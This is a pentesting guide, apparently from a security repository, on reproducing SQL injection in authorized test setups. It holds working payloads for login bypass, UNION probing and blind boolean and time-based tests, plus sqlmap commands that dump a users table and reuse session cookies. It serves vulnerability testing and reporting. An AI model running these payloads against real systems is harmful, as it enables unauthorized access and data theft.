# Reproducing SQL Injection (SQLi)

This guide provides step-by-step methods to identify and reproduce SQL injection vulnerabilities in a safe test environment.

## Prerequisites

- Target under legal authorization
- Burp Suite Community/Pro, a browser, and optional SQLMap
- A test account if needed

## Test Scenarios

### 1) Login Form (Auth Bypass)

Steps:
1. Intercept POST /login with Burp Proxy
2. In the username field, try: admin'-- and set any password
3. Forward the request and observe if login succeeds

Expected vulnerable behavior: Authentication bypassed, session cookie set

### Example Burp Request
```
POST /login HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=test
```

### 2) ID Parameter (In-Band/Union)

Steps:
1. Browse to /product?id=1
2. Add a single quote: /product?id=1'
3. If error or behavior change occurs, try UNION-based probing by adding columns with NULLs

Union probe example: /product?id=1 UNION SELECT NULL,NULL--

### Example Burp Request
```
GET /product?id=1%20UNION%20SELECT%20NULL,NULL--%20- HTTP/1.1
Host: target.local
```

### 3) Blind Boolean

Steps:
1. Toggle true/false: id=1 AND 1=1 vs id=1 AND 1=2
2. Compare response content length or status code

### 4) Time-Based Blind

Steps:
1. For MySQL: id=1 AND SLEEP(5)
2. For MSSQL: id=1; WAITFOR DELAY '00:00:05'
3. Measure response time consistently 3+ times

### 5) Search Parameter (String Context)

Steps:
1. Submit search q=' OR '1'='1
2. Observe result count inflation or errors

## SQLMap Quick Commands

- Basic: sqlmap -u "http://target.local/product?id=1" --batch
- Detect DBMS: sqlmap -u URL --dbms=mysql --batch
- Dump table: sqlmap -u URL -D appdb -T users --dump
- Cookie-based: sqlmap -u URL --cookie="SESSION=..." --batch

## Validation and Evidence

- Screenshots of successful bypass/data extraction
- Response diffs (length/time)
- Database names, table/column enumeration (sanitized)

## Safe Cleanup

- Avoid destructive payloads in production
- Coordinate findings with owners; provide PoC requests and reproduction steps

---

Related: [README.md](./README.md) | [Payloads.md](./Payloads.md) | [Remediation.md](./Remediation.md) | [BurpSuite-Guide.md](./BurpSuite-Guide.md)
